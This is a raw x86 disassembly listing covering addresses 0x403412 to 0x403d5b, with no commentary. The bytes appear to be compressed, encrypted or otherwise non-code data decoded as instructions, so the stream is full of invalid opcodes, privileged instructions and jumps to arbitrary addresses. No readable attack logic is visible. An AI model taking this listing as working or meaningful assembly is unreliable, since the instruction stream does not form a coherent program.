  403412:	or     al,0x0
  403414:	mov    WORD PTR [eax-0x6a4303b7],gs
  40341a:	push   edi
  40341b:	jmp    0x403420
	...
  403430:	sbb    esp,DWORD PTR [esi]
  403432:	jo     0x4033b9
  403434:	and    ebp,DWORD PTR [edi]
  403436:	ret    0x5cff
  403439:	gs xor bh,ch
  40343c:	add    ebx,DWORD PTR [esi-0xa]
  40343f:	mov    edi,0xb4532981
  403444:	inc    esp
  403445:	ins    BYTE PTR es:[edi],dx
  403446:	or     al,0x8d
  403448:	adc    DWORD PTR [esi-0x3f],eax
  40344b:	jmp    ebx
  40344d:	pushf  
  40344e:	aam    0x89
  403450:	loope  0x403437
  403452:	sar    edi,0x59
  403455:	inc    ebp
  403456:	cmp    ebp,eax
  403458:	loopne 0x403479
  40345a:	ret    0xb7ff
  40345d:	sub    eax,0xd88475c2
  403462:	mov    bh,ch
  403464:	mov    dl,0xd
  403466:	ret    0xb450
  403469:	test   ecx,ebx
  40346b:	jmp    DWORD PTR [ebx-0x678a3c64]
  403471:	pushf  
  403472:	aam    0x25
  403474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403475:	xchg   ebx,eax
  403476:	outs   dx,BYTE PTR ds:[esi]
  403477:	retf   0x5497
  40347a:	fnsave [esi]
  40347c:	add    eax,0x5d
  40347f:	(bad)  [edx]
  403481:	sub    al,0x46
  403483:	retf   0xd005
  403486:	dec    ecx
  403487:	xchg   cl,ch
  403489:	cmp    al,0xe1
  40348b:	dec    edi
  40348c:	into   
  40348d:	pop    es
  40348e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40348f:	iret   
  403490:	mov    esp,0xc7bc35
	...
  4034a5:	add    BYTE PTR [eax],al
  4034a7:	add    BYTE PTR [esp+esi*8+0x4b],ah
  4034ab:	add    ecx,DWORD PTR [edi+ecx*1+0x357e4b21]
  4034b2:	xchg   esp,eax
  4034b3:	iret   
  4034b4:	and    al,0xc0
  4034b6:	and    eax,0x21898c03
  4034bb:	dec    edi
  4034bc:	jb     0x4034a2
  4034be:	test   BYTE PTR [edi+0x24],0x2d
  4034c2:	inc    edx
  4034c3:	aam    0x1b
  4034c5:	ss push 0xffffffab
  4034c8:	mov    ah,0x35
  4034ca:	push   esp
  4034cb:	int3   
  4034cc:	pop    edi
  4034cd:	in     al,0xd9
  4034cf:	mov    bh,0xfd
  4034d1:	xor    eax,0x4081c9de
  4034d6:	leave  
  4034d7:	sub    edx,eax
  4034d9:	xchg   esp,eax
  4034da:	loope  0x403558
  4034dc:	push   ecx
  4034dd:	mov    BYTE PTR [esi-0x1efa1bb1],dh
  4034e3:	(bad)  [esi+0x43]
  4034e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e7:	leave  
  4034e8:	sar    DWORD PTR [edi+0x2caddcad],cl
  4034ee:	xchg   esi,eax
  4034ef:	leave  
  4034f0:	pop    ss
  4034f1:	push   edx
  4034f2:	cmp    bh,BYTE PTR [ebx+0x2ee18cce]
  4034f8:	pop    es
  4034f9:	sub    DWORD PTR [esi],edx
  4034fb:	jge    0x403526
  4034fd:	mov    WORD PTR [edx+0x8293af3],ds
  403503:	out    dx,eax
  403504:	sbb    ebp,ecx
  403506:	or     DWORD PTR [ecx-0x73],esp
  403509:	int    0x88
  40350b:	add    BYTE PTR es:[eax],al
	...
  40351e:	add    BYTE PTR [eax],al
  403520:	nop
  403521:	mov    edi,0xcdc4befd
  403526:	mov    BYTE PTR [esi],dl
  403528:	mov    al,0xc0
  40352a:	loop   0x403595
  40352c:	test   DWORD PTR [edi+0x75104c7c],eax
  403532:	add    dh,BYTE PTR [ebp-0x1fc8eb91]
  403538:	retf   
  403539:	pop    ecx
  40353a:	sub    DWORD PTR [edi+edx*2+0x67f17d36],0x3c
  403542:	shr    ecx,cl
  403544:	(bad)  
  403545:	adc    eax,esi
  403547:	jmp    0x8dc8a329
  40354c:	xchg   DWORD PTR ds:0xb53a7d28,esi
  403552:	je     0x403515
  403554:	push   esp
  403555:	xchg   DWORD PTR [edi+eiz*8+0xf],edi
  403559:	mov    eax,0xc111ee30
  40355e:	punpckhwd mm2,QWORD PTR [ebx+0x7c]
  403562:	div    eax
  403564:	push   edx
  403565:	(bad)  
  403566:	into   
  403567:	sub    eax,0xc2083588
  40356c:	mov    DWORD PTR [ecx],ebp
  40356e:	or     dl,dl
  403570:	and    edx,ebp
  403572:	shr    DWORD PTR [ebx+0x625c34e3],0xc3
  403579:	adc    ah,cl
  40357b:	lds    ebx,FWORD PTR [eax-0x77accaef]
  403581:	ror    DWORD PTR [eax],cl
  403583:	jmp    0x403588
	...
  403598:	push   ebx
  403599:	mov    ds:0xc915d48b,al
  40359e:	dec    ecx
  40359f:	jmp    0x41f633
  4035a4:	mov    ds,WORD PTR ss:[esi+0x890744b]
  4035ab:	jne    0x403557
  4035ad:	xchg   edi,eax
  4035ae:	enter  0xec5b,0x4e
  4035b2:	add    BYTE PTR [eax],al
  4035b4:	sahf   
  4035b5:	add    edi,ecx
  4035b7:	inc    ebp
  4035b8:	fst    DWORD PTR [edi-0x549afff8]
  4035be:	dec    ebp
  4035bf:	clc    
  4035c0:	xor    eax,0x3f087d5d
  4035c5:	cwde   
  4035c6:	not    DWORD PTR ds:0x4970ff
  4035cc:	outs   dx,BYTE PTR ds:[esi]
  4035cd:	pop    eax
  4035ce:	jl     0x40362b
  4035d0:	int    0x4e
  4035d2:	rol    DWORD PTR [eax],cl
  4035d4:	xor    eax,0xe88dd8b1
  4035d9:	arpl   WORD PTR [eax+0x6a],bx
  4035dc:	inc    ebp
  4035dd:	push   0xfffffff7
  4035df:	adc    eax,0x4970bb
  4035e4:	push   ds
  4035e5:	pop    eax
  4035e6:	jl     0x403611
  4035e8:	push   0x72
  4035ea:	in     al,dx
  4035eb:	add    DWORD PTR ds:0x98ff0898,esp
  4035f1:	pop    edi
  4035f2:	xchg   DWORD PTR [ebp-0x23],eax
  4035f5:	pop    ebx
  4035f6:	jge    0x4035f4
  4035f8:	jb     0x4035cf
  4035fa:	in     al,0x83
	...
  403610:	pusha  
  403611:	sub    al,0xf7
  403613:	jae    0x403601
  403615:	repnz dec esp
  403617:	lock not DWORD PTR [edi+0x33be0008]
  40361e:	into   
  40361f:	inc    ebp
  403620:	adc    eax,0xe5000899
  403625:	int    0x8
  403627:	push   0xffffffb5
  403629:	int    0x18
  40362b:	lea    ebp,[eax+0x34]
  40362e:	pop    eax
  40362f:	push   0xffffff8c
  403631:	cmp    eax,0x22b875ce
  403636:	stc    
  403637:	lods   eax,DWORD PTR ds:[esi]
  403638:	push   edi
  403639:	jl     0x403647
  40363b:	or     ecx,esp
  40363d:	sub    DWORD PTR [ebx+eax*2],ecx
  403640:	movaps xmm7,xmm0
  403643:	add    BYTE PTR [eax],bl
  403645:	xor    eax,0xc58075ce
  40364a:	icebp  
  40364b:	fimul  DWORD PTR [ebp+edi*1+0x74d7c372]
  403652:	retf   0x8c08
  403655:	call   0xf0ac22cb
  40365a:	repnz out 0x8b,eax
  40365d:	jbe    0x40366b
  40365f:	add    ah,cl
  403661:	or     eax,0x825c41d3
  403666:	iret   
  403667:	push   eax
  403668:	dec    ebx
  403669:	adc    bl,dh
  40366b:	dec    edi
  40366c:	xor    al,0x29
  40366e:	mov    ds:0xb3e58c00,al
  403673:	ret    0x0
	...
  403686:	add    BYTE PTR [eax],al
  403688:	mov    BYTE PTR ds:0xbe388b38,bh
  40368e:	enter  0xbffc,0xbe
  403692:	inc    ecx
  403693:	or     BYTE PTR [eax+esi*4+0x64c2af6],cl
  40369a:	mov    ah,0xc2
  40369c:	xchg   esp,eax
  40369d:	cmp    eax,0x3d76db12
  4036a2:	push   ecx
  4036a3:	add    BYTE PTR [esi+0x3d],ah
  4036a6:	push   ecx
  4036a7:	add    bl,dh
  4036a9:	(bad)  
  4036aa:	lock (bad) 
  4036ac:	popa   
  4036ad:	and    eax,0x3d760051
  4036b2:	shl    DWORD PTR [esi],cl
  4036b4:	mov    bh,0x3c
  4036b6:	or     ecx,DWORD PTR [ebx]
  4036b8:	int3   
  4036b9:	push   0x94518918
  4036be:	lods   eax,DWORD PTR ds:[esi]
  4036bf:	(bad)  
  4036c0:	cmp    DWORD PTR [eax],esi
  4036c2:	cdq    
  4036c3:	int    0xab
  4036c5:	xor    bl,BYTE PTR [esi-0x33580c06]
  4036cb:	jp     0x403691
  4036cd:	mov    ebp,0x338c59e1
  4036d2:	cld    
  4036d3:	(bad)  
  4036d4:	aas    
  4036d5:	xor    esi,esp
  4036d7:	not    DWORD PTR [edx-0x73a61658]
  4036dd:	mov    esi,0x4d96dbe1
  4036e2:	loope  0x4036e7
  4036e4:	xchg   DWORD PTR [esp+edx*8-0x5],edx
  4036e8:	fidivr WORD PTR [ecx+ebx*4]
  4036eb:	(bad)  
	...
  403700:	imul   esi,DWORD PTR [edx],0x1a
  403703:	stos   DWORD PTR es:[edi],eax
  403704:	pop    ss
  403705:	push   esi
  403706:	stos   BYTE PTR es:[edi],al
  403707:	mov    esp,0x30e19d4e
  40370c:	pop    es
  40370d:	inc    ecx
  40370e:	retf   
  40370f:	(bad)  
  403710:	dec    ebx
  403711:	test   al,0xf9
  403713:	fisttp DWORD PTR [ebx]
  403715:	xor    dl,BYTE PTR [esi]
  403717:	mov    BYTE PTR [ebp+0x57],0xe5
  40371b:	add    ebx,ecx
  40371d:	sbb    eax,0xa0a981f5
  403722:	loope  0x403773
  403724:	mov    dl,BYTE PTR ds:0xa91bfb74
  40372a:	out    0x1a,eax
  40372c:	dec    esp
  40372d:	pop    esp
  40372e:	and    edi,ebx
  403730:	or     edi,DWORD PTR [ecx+eiz*8-0x295f863c]
  403737:	dec    edi
  403738:	test   BYTE PTR [edi+eiz*4],bh
  40373b:	test   eax,0xc3ea948c
  403740:	pusha  
  403741:	test   BYTE PTR [eax+0x3c319057],dl
  403747:	clc    
  403748:	fisub  DWORD PTR [edi-0x1e481ef8]
  40374e:	imul   DWORD PTR [esi+0x72103dd1]
  403754:	and    DWORD PTR [eax-0x5827c6b8],0xffffffe7
  40375b:	xchg   esi,eax
  40375c:	leave  
  40375d:	(bad)  
  40375e:	not    DWORD PTR [esp+eiz*4]
  403761:	loope  0x40375a
  403763:	cld    
	...
  403778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403779:	cmp    DWORD PTR [edi+0x5031d18e],edx
  40377f:	mov    al,ds:0x14089cce
  403784:	add    eax,0xbcbe5e41
  403789:	adc    eax,0xa78ff175
  40378e:	add    DWORD PTR [edx],eax
  403790:	dec    eax
  403791:	int    0x57
  403793:	scas   eax,DWORD PTR es:[edi]
  403794:	es push esi
  403796:	add    cl,ch
  403798:	in     al,0xd7
  40379a:	add    al,0x6a
  40379c:	jo     0x403731
  40379e:	add    ebp,DWORD PTR [ecx]
  4037a0:	mov    esp,0x7529239b
  4037a5:	rcl    DWORD PTR [esi+0x30],1
  4037a8:	dec    esi
  4037a9:	pushf  
  4037aa:	or     BYTE PTR [edx+0x73],dh
  4037ad:	mov    al,ds:0x1e379c83
  4037b2:	test   BYTE PTR [edx],0xd5
  4037b5:	mov    edx,0x300fef83
  4037ba:	cmp    BYTE PTR [ebx+0x15],bh
  4037bd:	mov    cl,0xf4
  4037bf:	mov    al,0xc0
  4037c1:	xchg   edi,eax
  4037c2:	mov    ch,bh
  4037c4:	lahf   
  4037c5:	cmp    eax,0xd2cb6925
  4037ca:	jp     0x4037b8
  4037cc:	wrmsr  
  4037ce:	dec    esi
  4037cf:	pop    esi
  4037d0:	lock mov al,0xe4
  4037d3:	sub    BYTE PTR [eax],dl
  4037d5:	pop    eax
  4037d6:	add    al,BYTE PTR [eax]
  4037d8:	mov    esi,0xfc773b
	...
  4037ed:	add    BYTE PTR [eax],al
  4037ef:	add    BYTE PTR [esi+eax*8+0x5],al
  4037f3:	sbb    BYTE PTR [ecx],0xcf
  4037f6:	jg     0x403800
  4037f8:	xor    eax,0xf1806949
  4037fd:	sub    ah,dl
  4037ff:	or     esi,ebx
  403801:	push   esp
  403802:	push   ebx
  403803:	pop    edi
  403804:	jnp    0x4037f3
  403806:	leave  
  403807:	or     BYTE PTR [ebp-0x628dc768],dh
  40380d:	cwde   
  40380e:	xor    DWORD PTR [edi-0x4f],esi
  403811:	mov    BYTE PTR [eax],bh
  403813:	jmp    0x4037d5
  403815:	cwde   
  403816:	dec    ecx
  403817:	jb     0x403888
  403819:	cwde   
  40381a:	dec    esi
  40381b:	ja     0x403890
  40381d:	mov    BYTE PTR [ecx+0x4],cl
  403820:	jg     0x40386f
  403822:	pop    ds
  403823:	cmp    al,0x44
  403825:	mov    BYTE PTR [edx],0x3c
  403828:	push   ebx
  403829:	loope  0x403839
  40382b:	sub    al,0x54
  40382d:	xor    BYTE PTR [ecx],al
  40382f:	jmp    0x40388d
  403831:	(bad)  
  403832:	enter  0xfa5b,0x79
  403836:	rol    edx,0x2d
  403839:	xchg   esp,eax
  40383a:	enter  0x31e0,0x2e
  40383e:	retf   
  40383f:	stos   BYTE PTR es:[edi],al
  403840:	(bad)  
  403841:	ins    BYTE PTR es:[edi],dx
  403842:	mov    eax,esi
  403844:	daa    
  403845:	sub    eax,0x1bb475d2
  40384a:	or     DWORD PTR [eax],eax
  40384c:	xor    eax,0xfb5f5394
  403851:	jmp    0x0:0x8c9
	...
  403868:	and    eax,0x1d505b81
  40386d:	int3   
  40386e:	pop    ss
  40386f:	sub    dh,BYTE PTR [ebp-0x1b8d0f68]
  403875:	push   esi
  403876:	idiv   DWORD PTR [ebx+0xb3c8c]
  40387c:	mov    WORD PTR [esi],ds
  40387e:	xchg   ebx,eax
  40387f:	dec    ebp
  403880:	dec    ebp
  403881:	cmp    eax,0x45430125
  403886:	dec    edx
  403887:	std    
  403888:	shl    esi,cl
  40388a:	out    dx,al
  40388b:	xlat   BYTE PTR ds:[ebx]
  40388c:	enter  0xcb2a,0xb9
  403890:	ret    
  403891:	test   dl,0xff
  403894:	mov    esi,0x3906f4df
  403899:	adc    eax,0x7e47c387
  40389e:	iret   
  40389f:	push   ebp
  4038a0:	pop    ss
  4038a1:	or     cl,BYTE PTR [edi+0x5c8a9cc4]
  4038a7:	pop    eax
  4038a8:	and    al,0x84
  4038aa:	out    0x3f,al
  4038ac:	mov    WORD PTR [ebp-0x49b0fec2],fs
  4038b2:	(bad)  
  4038b3:	cmp    eax,0x4be222
  4038b8:	mov    WORD PTR [ecx+0x1d],ss
  4038bb:	sub    DWORD PTR [ecx-0x73beb841],0x3d
  4038c2:	aas    
  4038c3:	or     DWORD PTR [edi],ecx
  4038c5:	xor    BYTE PTR [ebp+0x4b],ch
  4038c8:	int    0x3d
  4038ca:	or     esi,DWORD PTR [ebp+0x0]
	...
  4038dd:	add    BYTE PTR [eax],al
  4038df:	add    BYTE PTR [ecx+0x555bcc92],dl
  4038e5:	jp     0x4038ce
  4038e7:	fisub  DWORD PTR [ebx+ebx*1]
  4038ea:	aam    0x0
  4038ec:	mov    WORD PTR [eax+0x13befc51],?
  4038f2:	add    edx,DWORD PTR [eax+0x23]
  4038f5:	push   eax
  4038f6:	xchg   ecx,eax
  4038f7:	dec    ebx
  4038f8:	int    0x3d
  4038fa:	push   es
  4038fb:	rol    BYTE PTR [ebx-0x73ff633f],0x3d
  403902:	ret    0x445
  403905:	xchg   esp,eax
  403906:	loope  0x40390b
  403908:	mov    WORD PTR [esp+eiz*2+0x4bc3f448],ss
  40390f:	add    al,0x76
  403911:	xchg   esp,eax
  403912:	dec    ebx
  403913:	add    eax,0xc2cda8e3
  403918:	or     DWORD PTR [esi],0x9b8c453a
  40391e:	mov    eax,ds:0xff3c3638
  403923:	fmul   QWORD PTR [esp+edx*4-0x56c9449e]
  40392a:	add    DWORD PTR [edi+0x37e12c31],eax
  403930:	inc    esi
  403931:	das    
  403932:	sbb    al,0xbc
  403934:	mov    ah,0x3f
  403936:	pushf  
  403937:	ret    0x1c9b
  40393a:	sub    al,0xb8
  40393c:	add    ecx,ebx
  40393e:	jns    0x403993
  403940:	mov    ebp,DWORD PTR [eax+0xc279]
	...
  403956:	add    BYTE PTR [eax],al
  403958:	stc    
  403959:	sub    bl,bl
  40395b:	add    al,0x7b
  40395d:	test   al,0x55
  40395f:	ret    0xe99
  403962:	stos   BYTE PTR es:[edi],al
  403963:	inc    esp
  403964:	mov    WORD PTR [ecx+0x19b23721],ds
  40396a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40396b:	mov    bh,0x7
  40396d:	test   DWORD PTR [eax+ecx*2+0x5c],esp
  403971:	lds    edx,FWORD PTR [ebx-0x560d5e3e]
  403977:	inc    esp
  403978:	mov    WORD PTR [ecx-0x4369c8df],ds
  40397e:	jnp    0x4039d0
  403980:	int    0x94
  403982:	push   ds
  403983:	cmp    BYTE PTR [edi*1-0x6b73250b],bl
  40398a:	cli    
  40398b:	ret    
  40398c:	mov    eax,ds:0x99c2a293
  403991:	and    al,0x8
  403993:	add    edx,eax
  403995:	dec    esp
  403996:	or     cl,ch
  403998:	into   
  403999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40399a:	cld    
  40399b:	rcl    DWORD PTR [ecx],1
  40399d:	inc    eax
  40399e:	neg    esi
  4039a0:	int    0xa7
  4039a2:	hlt    
  4039a3:	rcl    DWORD PTR [ebx+0x4c],0x8
  4039a7:	jmp    0xb0938bbc
  4039ac:	rol    edi,1
  4039ae:	or     ebp,0xf
  4039b1:	pop    ecx
  4039b2:	enter  0xcdb7,0x2d
  4039b6:	pop    ebx
  4039b7:	sbb    DWORD PTR [eax-0x44],esp
  4039ba:	dec    eax
  4039bb:	rol    BYTE PTR [eax],cl
	...
  4039cd:	add    BYTE PTR [eax],al
  4039cf:	add    BYTE PTR [edi-0x6c],cl
  4039d2:	lock sbb ecx,DWORD PTR [edi-0x549508af]
  4039d9:	retf   
  4039da:	inc    ebx
  4039db:	sub    BYTE PTR [eax+0x10e27c94],cl
  4039e1:	jo     0x403a39
  4039e3:	xor    cl,BYTE PTR [edi-0x6c]
  4039e6:	or     ch,bh
  4039e8:	mov    eax,ds:0xd1573511
  4039ed:	ror    DWORD PTR [eax],cl
  4039ef:	jmp    0x1ccbd5b7
  4039f4:	adc    bl,cl
  4039f6:	dec    ecx
  4039f7:	jmp    0x24de18b
  4039fc:	dec    eax
  4039fd:	leave  
  4039fe:	shr    DWORD PTR [edx],0x69
  403a01:	dec    edx
  403a02:	not    esp
  403a04:	mov    cl,0xd9
  403a06:	dec    ecx
  403a07:	jmp    0x273d1122
  403a0c:	or     esp,DWORD PTR [eax-0xa]
  403a0f:	es dec ebp
  403a11:	jl     0x403a1c
  403a13:	jmp    0x8348f4a7
  403a18:	xchg   ecx,eax
  403a19:	cmp    al,0x7b
  403a1b:	xor    DWORD PTR [eax-0x72ff746c],ecx
  403a21:	push   ebx
  403a22:	pop    es
  403a23:	test   BYTE PTR [ebx],dh
  403a25:	xchg   edx,eax
  403a26:	or     BYTE PTR [eax],al
  403a28:	ins    BYTE PTR es:[edi],dx
  403a29:	adc    eax,0x53f2fec0
  403a2e:	test   DWORD PTR [ebp-0x8acbf],eax
	...
  403a48:	mov    ch,0x53
  403a4a:	mov    ebp,0xf753c3c8
  403a4f:	call   0x488af1
  403a54:	ficom  WORD PTR [eax+0x7]
  403a57:	test   BYTE PTR [esi],dl
  403a59:	xchg   ecx,eax
  403a5a:	or     BYTE PTR [eax],al
  403a5c:	dec    ebp
  403a5d:	ins    DWORD PTR es:[edi],dx
  403a5e:	inc    ebp
  403a5f:	inc    ecx
  403a60:	mov    ch,0x1d
  403a62:	(bad)  
  403a63:	lock repz push ebx
  403a66:	not    DWORD PTR [eax+0x1d]
  403a69:	enter  0xd1,0xb5
  403a6d:	lahf   
  403a6e:	enter  0x290f,0x58
  403a72:	or     BYTE PTR [eax],al
  403a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a75:	pop    ebx
  403a76:	(bad)  
  403a77:	les    edx,FWORD PTR [ebx]
  403a79:	push   esp
  403a7a:	test   DWORD PTR [eax],0x8d089875
  403a80:	call   0xf34030d8
  403a85:	(bad)  
  403a86:	div    DWORD PTR [ebp-0x8aa47]
  403a8c:	ret    0x5682
  403a8f:	dec    ebx
  403a90:	xor    al,0x98
  403a92:	adc    DWORD PTR [ebp-0x8aa57],0x5e
  403a99:	pop    eax
  403a9a:	pop    es
  403a9b:	test   ch,bl
  403a9d:	xchg   edi,eax
  403a9e:	or     BYTE PTR [eax],al
  403aa0:	ds ret 
  403aa2:	cld    
  403aa3:	push   gs
  403aa5:	add    al,0x8
  403aa7:	add    BYTE PTR ds:0xd4bd55,ah
	...
  403abd:	add    BYTE PTR [eax],al
  403abf:	add    BYTE PTR [ebx+eax*4+0x3db6ffc8],cl
  403ac6:	and    eax,DWORD PTR [eax]
  403ac8:	mov    WORD PTR ds:0x831be80d,?
  403ace:	or     eax,DWORD PTR [eax]
  403ad0:	xchg   edi,eax
  403ad1:	jge    0x403b12
  403ad3:	jns    0x403aea
  403ad5:	icebp  
  403ad6:	mov    dl,0x8d
  403ad8:	push   ecx
  403ad9:	xor    DWORD PTR [eax+ebp*2-0x19],ebx
  403add:	cmp    al,0x9
  403adf:	add    bl,ch
  403ae1:	enter  0xffb4,0x79
  403ae5:	mov    ds:0x268c4143,eax
  403aea:	retf   
  403aeb:	je     0x403b21
  403aed:	jmp    0x4b91:0x48cbfc30
  403af4:	dec    ebp
  403af5:	cmp    eax,0x3440c002
  403afa:	dec    edx
  403afb:	(bad)  
  403afc:	or     esi,edi
  403afe:	mov    ch,0xff
  403b00:	stos   DWORD PTR es:[edi],eax
  403b01:	cmp    eax,0xc88c000b
  403b06:	add    eax,0x50b7129a
  403b0c:	and    al,0xea
  403b0e:	or     cl,BYTE PTR [edi]
  403b10:	mov    WORD PTR ds:0x3d8cd893,ss
  403b16:	add    al,al
  403b18:	add    DWORD PTR [ecx],ebp
  403b1a:	mov    bh,BYTE PTR [ebp-0x4834b4]
  403b20:	mov    WORD PTR [ecx+0x7],cs
  403b23:	inc    DWORD PTR [eax]
	...
  403b35:	add    BYTE PTR [eax],al
  403b37:	add    BYTE PTR [ecx],bl
  403b39:	jge    0x403af1
  403b3b:	call   FWORD PTR [ebx-0x5e]
  403b3e:	add    eax,ebx
  403b40:	(bad)  
  403b41:	cld    
  403b42:	or     ch,bl
  403b44:	jg     0x403b1c
  403b46:	adc    bh,bh
  403b48:	mov    ecx,0x62f0a479
  403b4d:	xchg   esp,eax
  403b4e:	loope  0x403b53
  403b50:	xor    esp,DWORD PTR [ecx+0x4234ac29]
  403b56:	loope  0x403b5b
  403b58:	aaa    
  403b59:	pushf  
  403b5a:	push   es
  403b5b:	cmp    DWORD PTR [esp+edi*1],edx
  403b5e:	das    
  403b5f:	(bad)  
  403b60:	mov    WORD PTR [esp+eiz*2-0x1d62777],ss
  403b67:	mov    esi,0xcc3c2b5c
  403b6c:	cli    
  403b6d:	sub    ch,dh
  403b6f:	stos   DWORD PTR es:[edi],eax
  403b70:	bound  eax,QWORD PTR [ebx-0x1f]
  403b73:	add    esi,ebp
  403b75:	nop
  403b76:	fidivr WORD PTR [esi-0x3463d51d]
  403b7c:	fisubr DWORD PTR [edx]
  403b7e:	into   
  403b7f:	stos   DWORD PTR es:[edi],eax
  403b80:	adc    BYTE PTR [edx-0x1f],al
  403b83:	add    edx,DWORD PTR [edi]
  403b85:	push   edi
  403b86:	sbb    cl,ch
  403b88:	iret   
  403b89:	shr    BYTE PTR [edx-0x51],0xf
  403b8d:	push   eax
  403b8e:	popf   
  403b8f:	push   ebx
  403b90:	pop    edi
  403b91:	lds    esi,FWORD PTR [ebx]
  403b93:	push   edi
  403b94:	inc    edx
  403b95:	pop    ds
  403b96:	and    al,0x10
  403b98:	adc    DWORD PTR [ecx+eiz*2],ebx
  403b9b:	add    eax,DWORD PTR [eax]
	...
  403bad:	add    BYTE PTR [eax],al
  403baf:	add    BYTE PTR [esp+edx*4-0x6c36e884],cl
  403bb6:	loope  0x403bbb
  403bb8:	mov    WORD PTR ds:0x54548a99,ds
  403bbe:	mov    DWORD PTR ds:0x8a5dd005,eax
  403bc4:	icebp  
  403bc5:	pushf  
  403bc6:	loop   0x403b84
  403bc8:	push   edx
  403bc9:	xchg   edx,eax
  403bca:	popa   
  403bcb:	sub    BYTE PTR [edi+0x6a],0xa
  403bcf:	mov    ebx,0x32092e0f
  403bd4:	adc    BYTE PTR [ebp-0x6b3384b6],0x8
  403bdb:	jmp    0xeb0bb96f
  403be0:	imul   DWORD PTR [ecx]
  403be2:	dec    ebp
  403be3:	adc    eax,0x6c30c200
  403be8:	fs and al,0xcf
  403beb:	out    dx,eax
  403bec:	mov    BYTE PTR [ebp+0x4d],dh
  403bef:	xchg   BYTE PTR [edx-0x2d],dl
  403bf2:	or     al,0x70
  403bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bf5:	push   edi
  403bf6:	out    0x26,eax
  403bf8:	push   ecx
  403bf9:	pushf  
  403bfa:	not    BYTE PTR ds:0xa7cf0c85
  403c00:	mov    esp,DWORD PTR [edx+0x29981b5c]
  403c06:	jge    0x403bd5
  403c08:	sub    DWORD PTR [eax+0x244b6400],esp
  403c0e:	pop    eax
  403c0f:	rol    DWORD PTR [ebx+0xe90894],0x0
	...
  403c26:	add    BYTE PTR [eax],al
  403c28:	adc    ebp,esp
  403c2a:	or     ebp,ecx
  403c2c:	(bad)  
  403c2d:	xchg   esp,eax
  403c2e:	xor    DWORD PTR [eax+ebx*4],0x25
  403c32:	lods   eax,DWORD PTR ds:[esi]
  403c33:	mulps  xmm1,xmm6
  403c36:	push   ecx
  403c37:	inc    edx
  403c38:	push   eax
  403c39:	pop    ebx
  403c3a:	retf   0x8fed
  403c3d:	mov    edi,0x510d8583
  403c42:	hlt    
  403c43:	aaa    
  403c44:	inc    ecx
  403c45:	les    ebx,FWORD PTR [ebx+0x18]
  403c48:	ds sbb eax,0xa714ed7d
  403c4e:	add    BYTE PTR [edx-0x35],ah
  403c51:	test   BYTE PTR [ecx+0xf1d4c24],al
  403c57:	jb     0x403c2a
  403c59:	nop
  403c5a:	sub    DWORD PTR [esi-0x1aa0e269],0x14
  403c61:	sub    edi,DWORD PTR [ebx]
  403c63:	push   ebx
  403c64:	ins    DWORD PTR es:[edi],dx
  403c65:	cmp    eax,DWORD PTR cs:[eax]
  403c68:	iret   
  403c69:	sbb    DWORD PTR [edi+eax*1-0x289d4eb3],ecx
  403c70:	(bad)
  403c75:	xchg   esp,eax
  403c76:	retf   
  403c77:	mov    ebp,DWORD PTR [esi+0x23]
  403c7a:	lock and ebp,DWORD PTR [ebp+0x23]
  403c7e:	lock lea esp,[ecx+0x72b75e7f]
  403c85:	clc    
  403c86:	or     dl,BYTE PTR [esi+0x21]
  403c89:	push   esi
  403c8a:	retf   0xc
	...
  403c9d:	add    BYTE PTR [eax],al
  403c9f:	add    dh,dh
  403ca1:	inc    esp
  403ca2:	cmp    eax,0x46
  403ca5:	in     al,dx
  403ca6:	sub    bh,dl
  403ca8:	ss in  al,dx
  403caa:	test   BYTE PTR [edx+edi*8-0x6edf87b5],cl
  403cb1:	xchg   ebx,eax
  403cb2:	inc    esi
  403cb3:	or     BYTE PTR [esi+edx*2],dh
  403cb6:	sbb    DWORD PTR [ebx],eax
  403cb8:	das    
  403cb9:	sbb    al,0xf2
  403cbb:	xor    ecx,ebp
  403cbd:	xor    esi,eax
  403cbf:	xor    ecx,ebp
  403cc1:	sbb    DWORD PTR [edi+ebx*1-0x3e4aa935],edx
  403cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc9:	mov    BYTE PTR [ecx+eax*8],0xe6
  403ccd:	jle    0x403cda
  403ccf:	fstp   DWORD PTR [esi]
  403cd1:	out    dx,al
  403cd2:	cmp    bh,dl
  403cd4:	(bad)  
  403cd5:	jmp    0x403d11
  403cd7:	cli    
  403cd8:	cmp    BYTE PTR [ecx],dl
  403cda:	imul   ebx,DWORD PTR [edx-0x4cfc0298]
  403ce1:	or     cl,0xc0
  403ce4:	jb     0x403c7b
  403ce6:	retf   
  403ce7:	mov    edi,esi
  403ce9:	and    al,0xf0
  403ceb:	and    ebp,ebp
  403ced:	and    al,0xf0
  403cef:	(bad)  
  403cf0:	loope  0x403c72
  403cf2:	and    al,dh
  403cf4:	mov    WORD PTR [esi+0x21c2034c],?
  403cfa:	retf   0x80c2
  403cfd:	cmp    bl,bl
  403cff:	mov    eax,DWORD PTR [ebx+ebp*1-0x50]
  403d03:	and    eax,DWORD PTR [eax]
	...
  403d15:	add    BYTE PTR [eax],al
  403d17:	add    BYTE PTR [esi+0x2b],al
  403d1a:	mov    al,0x8d
  403d1c:	or     BYTE PTR [edi+0x18],al
  403d1f:	inc    esi
  403d20:	jl     0x403ce7
  403d22:	or     BYTE PTR [esi-0x7c],cl
  403d25:	jl     0x403cf1
  403d27:	adc    DWORD PTR [edi+0x5ffa8073],ecx
  403d2d:	test   eax,ebp
  403d2f:	clc    
  403d30:	pop    edi
  403d31:	xchg   ebp,eax
  403d32:	xchg   BYTE PTR [ebx+ebp*4+0x1469e3c],bl
  403d39:	cmp    edx,DWORD PTR [ebp+0x1c]
  403d3c:	int    0x7a
  403d3e:	sbb    eax,0xb5a2d503
  403d43:	xor    esp,esi
  403d45:	call   0x788:0xb0e633b7
  403d4c:	mov    ah,0xa5
  403d4e:	mov    WORD PTR [ecx-0x71],gs
  403d51:	ja     0x403d3f
  403d53:	ror    ah,0x2e
  403d56:	push   cs
  403d57:	ret    
  403d58:	pop    ss
  403d59:	jecxz  0x403d59
  403d5b:	clc    
